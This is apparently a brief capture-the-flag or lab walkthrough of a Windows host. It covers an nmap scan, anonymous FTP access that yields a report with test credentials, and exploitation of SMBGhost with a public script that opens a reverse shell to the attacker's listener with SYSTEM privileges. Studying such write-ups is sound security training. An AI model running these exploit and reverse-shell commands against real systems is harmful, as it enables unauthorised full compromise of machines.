## NMAP
```
nmap -A -T4 10.10.110.20
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-04 23:42 BST
Nmap scan report for 10.10.110.20
Host is up (0.082s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE       VERSION
21/tcp  open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 192.168.1.20 is not the same as 10.10.110.20
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h59m20s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-04-05T06:42:30
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.88 seconds
```
## FTP
```
FTP 10.10.110.20
login as anonymous and download the pentest report
```
```
cat pentest_report.txt 
// summary 

- Exploitation successful with credentials test / t3st123
- Vulnerability validated, PoC scanner was successful.

// next steps

- Disable Print Spooler after moving printer
- Disable SMBv3 for now.

```

This should have been vulnerable to printnightmare but I could not get it to work, so I used SMBGhost

## SMBGhost
https://github.com/Barriuso/SMBGhost_AutomateExploitation

```
./Smb_Ghost.py -i 10.10.110.20 --check -e --lhost 10.10.14.21 --lport 80
```
```
 nc -lvp 80
listening on [any] 80 ...
10.10.110.20: inverse host lookup failed: Unknown host
connect to [10.10.14.21] from (UNKNOWN) [10.10.110.20] 49707
Microsoft Windows [Version 10.0.18363.592]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

